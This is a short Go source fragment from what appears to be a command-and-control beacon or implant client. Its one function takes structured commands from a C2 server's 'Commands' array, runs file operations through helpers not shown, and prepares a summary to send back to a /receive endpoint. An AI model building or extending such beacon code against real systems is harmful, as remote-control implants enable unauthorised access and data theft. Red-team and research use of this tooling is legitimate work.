package httpclient

import (
	"errors"
)

// executeStructuredBeaconCommand runs a JSON-object entry from the C2 "Commands" array (file ops, etc.).
// summaryCommand is a small JSON string for POST /receive (no embedded file bytes).
func executeStructuredBeaconCommand(cmd interface{}) (summaryCommand string, output string, err error) {
	m, ok := cmd.(map[string]interface{})
	if !ok {
		return "", "", errors.New("command must be a JSON object")
	}
	output, err = handleHTTPFileCommandMap(m)
	if err != nil {
		return "", "", err
	}
	summaryCommand = summarizeHTTPFileCommandForReceive(m)
	return summaryCommand, output, nil
}
